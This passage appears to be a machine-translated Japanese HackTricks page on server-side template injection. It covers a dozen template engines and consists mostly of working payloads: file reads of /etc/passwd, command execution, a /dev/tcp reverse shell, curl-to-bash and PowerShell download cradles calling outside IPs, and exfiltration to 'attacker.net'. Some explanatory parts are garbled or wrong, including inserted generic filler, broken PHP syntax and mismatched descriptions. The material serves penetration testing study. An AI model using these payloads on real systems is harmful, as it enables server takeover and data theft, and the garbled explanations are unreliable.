{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - テンプレート形式**

Twigは、PHPのための柔軟で強力なテンプレートエンジンです。テンプレート内で変数や制御構造を使用することができます。以下は、Twigテンプレートの基本的な構文です。

- 変数の表示: `{{ variable }}`
- 制御構造: `{% if condition %} ... {% endif %}`
- ループ: `{% for item in items %} ... {% endfor %}`
- テンプレートの継承: `{% extends 'base.html' %}`
- ブロックのオーバーライド: `{% block content %} ... {% endblock %}`

Twigは、サーバーサイドテンプレートインジェクション（SSTI）の攻撃に対して脆弱な場合があります。攻撃者は、テンプレート内に任意のコードを埋め込むことができ、サーバー上で実行されます。これにより、攻撃者はシステムに対して悪意のある操作を行うことができます。

SSTI攻撃を防ぐためには、以下の対策を実施する必要があります。

- ユーザー入力の検証とエスケープ処理を行う。
- テンプレート内でのユーザー入力の使用を最小限にする。
- テンプレートエンジンのセキュリティ設定を適切に構成する。

SSTI攻撃は深刻なセキュリティリスクであるため、開発者はテンプレートエンジンの脆弱性に注意を払い、適切な対策を講じる必要があります。
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**詳細情報**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)のTwigとTwig（Sandboxed）セクションで詳細を確認してください。
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)を参照してください。

### Plates（PHP）

PlatesはTwigに触発されたもので、コンパイルされたテンプレートエンジンではなく、ネイティブのPHPテンプレートエンジンです。

コントローラー：
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
ページのテンプレート：
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
レイアウトテンプレート：
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlibとHTML\_Template\_PHPLIB（PHP）

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB)はPHPlibと同じですが、Pearに移植されています。

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# SSTI (Server-Side Template Injection)

Server-Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious code into a server-side template, which is then executed by the server. This can lead to remote code execution (RCE) and other serious security issues.

## Exploiting SSTI in `authors.php`

In the `authors.php` file, there may be a vulnerability that allows for SSTI. By injecting malicious code into the server-side template, an attacker can execute arbitrary commands on the server.

To exploit this vulnerability, follow these steps:

1. Identify the injection point: Look for user-controlled input that is directly used in the template engine.
2. Test for SSTI: Inject a simple payload, such as `{{7*7}}`, to see if it is evaluated and the result is displayed on the page.
3. Escalate the attack: Once you confirm SSTI, you can escalate the attack by executing more complex commands, such as reading files or executing system commands.

## Prevention and Mitigation

To prevent SSTI vulnerabilities, follow these best practices:

- Avoid using user-controlled input directly in the template engine.
- Sanitize and validate user input before using it in the template.
- Use a secure template engine that automatically escapes user input.

By following these guidelines, you can reduce the risk of SSTI vulnerabilities in your application.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

Jade is a popular template engine for NodeJS. It is used to generate HTML markup with the help of a simple and concise syntax. However, it is important to be aware of the security risks associated with using Jade, as it can be vulnerable to Server-Side Template Injection (SSTI) attacks.

#### Server-Side Template Injection (SSTI)

Server-Side Template Injection occurs when an attacker is able to inject malicious code into a template engine, which is then executed on the server. This can lead to various security issues, such as remote code execution, information disclosure, and even server compromise.

#### Preventing SSTI in Jade

To prevent SSTI attacks in Jade, it is important to follow these best practices:

1. **Input Validation**: Always validate and sanitize user input before using it in templates. This helps to prevent any malicious code from being injected.

2. **Contextual Escaping**: Use proper escaping mechanisms to ensure that user input is treated as plain text and not interpreted as code. This can be achieved by using the appropriate escaping functions provided by the template engine.

3. **Template Whitelisting**: Limit the functionality of the template engine by whitelisting only the necessary features and disallowing potentially dangerous ones. This helps to reduce the attack surface and minimize the risk of SSTI vulnerabilities.

4. **Secure Configuration**: Ensure that the template engine is configured securely, with appropriate settings and permissions. This includes restricting access to sensitive resources and limiting the execution environment.

By following these best practices, you can significantly reduce the risk of SSTI vulnerabilities in Jade and ensure the security of your NodeJS applications.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**詳細情報**

* [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)のJadeセクションで詳細を確認できます。
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)を参照してください。

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template)は、非コンパイルのPHPテンプレートエンジンで、XMLタグを使用してドキュメントを異なる部分に分割します。
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

パストラバーサル（詳細は[こちら](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)を参照）。
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= エラー
* ${7\*7} = ${7\*7}
* 何もありません
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```
**詳細情報**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **テンプレート** | **説明**                                 |
| -------------- | --------------------------------------- |
|                | 評価して出力をレンダリングする              |
|                | 評価してHTMLエンコードされた出力をレンダリングする |
|                | コメント                                 |
| and            | コードを許可する（デフォルトでは無効）        |

* \= 49

**クライアントサイド**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**サーバーサイド**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**詳細情報**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**サーバーサイドレンダリングの例**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**詳細情報**

* [https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/](https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = 出力なし
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = エラー
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**詳細情報**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB（Ruby）

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = エラー`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**詳細情報**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**詳細情報**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

以下のページをチェックして、Pythonでの**サンドボックス回避による任意のコマンド実行のトリック**を学びましょう：

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = エラー`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**詳細情報**

### Jinja2（Python）

[公式ウェブサイト](http://jinja.pocoo.org)

> Jinja2はPythonのフル機能を備えたテンプレートエンジンです。完全なUnicodeサポート、オプションの統合されたサンドボックス実行環境、広く使用されているBSDライセンスがあります。

* `{{7*7}} = エラー`
* `${7*7} = ${7*7}`
* `{{foobar}} 何もありません`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - テンプレート形式**

Jinja2は、Pythonのテンプレートエンジンであり、Webアプリケーションの開発に広く使用されています。Jinja2テンプレートは、HTMLやXMLなどのマークアップ言語と組み合わせて使用され、動的なコンテンツを生成するために使用されます。

Jinja2テンプレートは、特定の構文を使用して変数、制御構造、フィルタ、マクロなどを表現します。以下に、Jinja2テンプレートの基本的な構文を示します。

- 変数の表示: `{{ variable }}`
- 制御構造（if文、forループなど）: `{% control_structure %}`
- フィルタの適用: `{{ variable|filter }}`
- マクロの定義: `{% macro macro_name() %} ... {% endmacro %}`

Jinja2テンプレートは、サーバーサイドテンプレートインジェクション（SSTI）攻撃の潜在的な脆弱性として知られています。攻撃者は、ユーザー入力をテンプレートに直接埋め込むことで、任意のコードを実行することができます。この攻撃を防ぐためには、入力の検証とエスケープ処理が重要です。

以下に、Jinja2テンプレートのSSTI攻撃の例を示します。

```python
from jinja2 import Template

template_string = """
Hello, {{ name }}!
{% for item in items %}
- {{ item }}
{% endfor %}
"""

template = Template(template_string)
output = template.render(name=request.args.get('name'), items=request.args.get('items'))
```

この例では、ユーザーからの入力が直接テンプレートに埋め込まれています。攻撃者は、`name`や`items`の値を操作することで、任意のコードを実行できます。

SSTI攻撃を防ぐためには、ユーザー入力を適切に検証し、エスケープ処理を行う必要があります。また、セキュリティパッチやアップデートを定期的に適用することも重要です。
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**`__builtins__`に依存しないRCE**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/)：

このテクニックは、Jinja2テンプレートエンジンを使用してサーバーサイドテンプレートインジェクション（SSTI）の脆弱性を悪用するものです。通常、SSTIは`__builtins__`を使用してリモートコード実行（RCE）を達成しますが、このテクニックでは`__builtins__`に依存せずにRCEを実現します。

このテクニックは、Jinja2テンプレートエンジンの`from_string`メソッドを使用して、任意のPythonコードを実行することができます。具体的には、以下の手順に従います：

1. Jinja2の`Environment`オブジェクトを作成します。
2. `Environment`オブジェクトの`from_string`メソッドを使用して、任意のPythonコードを含むテンプレートを作成します。
3. テンプレートをレンダリングし、Pythonコードが実行されます。

このテクニックは、`__import__`関数を使用して必要なモジュールをインポートし、`__builtins__`を使用せずにRCEを達成します。これにより、制限された環境でもRCEを実行することができます。

このテクニックを防ぐためには、入力の検証とサニタイズが重要です。また、Jinja2のセキュリティ設定を適切に構成することも推奨されます。
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Jinjaを悪用する方法の詳細**：

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= 成功`
* `@() <= 成功`
* `@("{{code}}") <= 成功`
* `@ <= 成功`
* `@{} <= エラー！`
* `@{ <= エラー！`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AMQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwMAXABQAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

.NETの`System.Diagnostics.Process.Start`メソッドは、サーバー上で任意のプロセスを起動し、ウェブシェルを作成するために使用できます。脆弱なウェブアプリの例は、[https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)で見つけることができます。

**詳細情報**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nothing
* `<%= response.write(date()) %>` = \<Date>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**詳細情報**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Perlであっても、RubyのERBのようなタグを使用します。

* `<%= 7*7 %> = 49`
* `<%= foobar %> = エラー`
```
<%= perl code %>
<% perl code %>
```
### GOにおけるSSTI

バックエンドで使用されているテンプレートエンジンがGoであることを確認する方法は、次のペイロードを使用することです：

* `{{ . }}` = テンプレートに渡される入力データのデータ構造
* 渡されたデータが、例えばPasswordという属性を含むオブジェクトである場合、前のペイロードはそれを漏洩させますが、`{{ .Password }}`のようにすることもできます。
* `{{printf "%s" "ssti" }}` = 応答に文字列sstiを出力するはずです
* `{{html "ssti"}}`、`{{js "ssti"}}` = これらは、末尾の単語「js」または「html」なしで文字列「ssti」を出力するいくつかの他のペイロードです。エンジンの[ここ](https://golang.org/pkg/text/template)でさらにキーワードを参照できます。

**XSSの悪用**

サーバーが**text/template**パッケージを使用している場合、XSSは単純に入力として**ペイロード**を提供することで非常に簡単に達成できます。ただし、html/templateでは応答をHTMLエンコードするため、それは**当てはまりません**：`{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

ただし、Goでは**テンプレートを定義**してから**後で呼び出す**ことができます。ペイロードは次のようになります：\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**RCEの悪用**

html/templateモジュールのドキュメントは[こちら](https://golang.org/pkg/html/template/)で見つけることができ、text/templateモジュールのドキュメントは[こちら](https://golang.org/pkg/text/template/)で見つけることができます。そして、はい、それらはかなり異なります。例えば、**text/template**では、「call」値を使用して直接任意の公開関数を呼び出すことができますが、html/templateではそうではありません。

SSTIを介してgoでRCEを見つけたい場合、テンプレートに渡されたオブジェクトに`{{ . }}`でアクセスできるようになるだけでなく、**オブジェクトのメソッドを呼び出す**こともできます。したがって、渡されたオブジェクトには、指定されたコマンドを実行するSystemというメソッドがあると想像してみてください。それを次のように悪用することができます：`{{ .System "ls" }}`\
したがって、おそらく**ソースコードが必要**になるでしょう。そのようなものの潜在的なソースコードは次のようになります：
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**詳細情報**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### その他の攻撃手法

詳細な攻撃手法については、[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)をチェックしてください。また、興味深いタグ情報は[https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)で見つけることができます。

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## 関連するヘルプ

役立つと思われる場合は、次を読んでください：

* [Flaskのトリック](../../network-services-pentesting/pentesting-web/flask.md)
* [Pythonのマジック関数](broken-reference/)

## ツール

{% embed url="https://github.com/epinna/tplmap" %}

## ブルートフォース検出リスト

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## 練習と参考

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。技術的な知識を促進することを使命としているこの会議は、あらゆる分野の技術とサイバーセキュリティの専門家の活発な交流の場です。

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションを発見してください。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>
